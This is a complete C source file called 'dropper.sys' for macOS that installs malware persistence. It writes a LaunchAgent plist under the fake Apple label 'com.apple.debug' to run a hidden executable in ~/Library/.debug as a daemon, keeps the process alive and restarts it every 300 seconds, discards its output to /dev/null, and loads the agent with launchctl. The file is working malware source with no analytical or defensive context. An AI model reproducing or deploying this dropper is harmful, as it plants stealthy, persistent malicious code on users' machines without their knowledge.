//
//  main.c
//  dropper.sys
//
//  Created by Nikola Tesla on 2/28/16.
//  Copyright © 2016 WireTech. All rights reserved.
//

#pragma GCC diagnostic ignored "-Wdeprecated-declarations"

#include <stdio.h>
#include <CoreFoundation/CoreFoundation.h>

#define LABEL "com.apple.debug"
#define RELATIVE_PATH "Library/LaunchAgents/" LABEL ".plist"
#define METASTASYS_EXECUTABLE "~/Library/.debug/debug-client"
#define LOAD_COMMAND "/bin/launchctl load -w " RELATIVE_PATH
#define START_COMMAND "/bin/launchctl start " LABEL

void create_launch_plist(void);
void load_launch_plist(void);

int main(int argc, const char * argv[]) {
    create_launch_plist();
    load_launch_plist();
    return 0;
}

char *get_output_path(void) {
    char *home = getenv("HOME");
    size_t output_dir_size = strlen(RELATIVE_PATH) + strlen(home) + 2;
    char *output = NULL;
    if ((output = malloc(output_dir_size)) == NULL) {
        exit(EXIT_FAILURE);
    }
    memset(output, '\0', output_dir_size);
    strlcpy(output, home, output_dir_size);
    strlcat(output, "/", output_dir_size);
    strlcat(output, RELATIVE_PATH, output_dir_size);
    return output;
}

void create_launch_plist(void) {
    char *output = get_output_path();
    CFStringRef output_string = CFStringCreateWithCString(kCFAllocatorDefault, output, kCFStringEncodingASCII);
    CFURLRef output_url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, output_string, kCFURLPOSIXPathStyle, false);
    CFRelease(output_string);
    free(output);
    CFStringRef arguments[2];
    arguments[0] = CFSTR(METASTASYS_EXECUTABLE);
    arguments[1] = CFSTR("--daemonize");
    CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 2, &kCFTypeArrayCallBacks);
    
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    
    CFDictionarySetValue(dict, CFSTR("Label"), CFSTR(LABEL));
    CFDictionarySetValue(dict, CFSTR("KeepAlive"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("EnableGlobbing"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("ProgramArguments"), arguments_array);
    CFRelease(arguments_array);
    CFDictionarySetValue(dict, CFSTR("StandardOutPath"), CFSTR("/dev/null"));
    CFDictionarySetValue(dict, CFSTR("StandardErrorPath"), CFSTR("/dev/null"));
    int respawn = 300;
    CFNumberRef start_interval = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &respawn);
    CFDictionarySetValue(dict, CFSTR("StartInterval"), start_interval);
    CFRelease(start_interval);
    CFErrorRef data_error;
    CFDataRef xml_data = CFPropertyListCreateData(kCFAllocatorDefault, dict, kCFPropertyListXMLFormat_v1_0, 0, &data_error);
    SInt32 error_code;
    CFURLWriteDataAndPropertiesToResource(output_url, xml_data, NULL, &error_code);
    CFRelease(xml_data);
    CFRelease(dict);
    CFRelease(output_url);
}

void load_launch_plist(void) {
    chdir(getenv("HOME"));
    system(LOAD_COMMAND);
    system(START_COMMAND);
}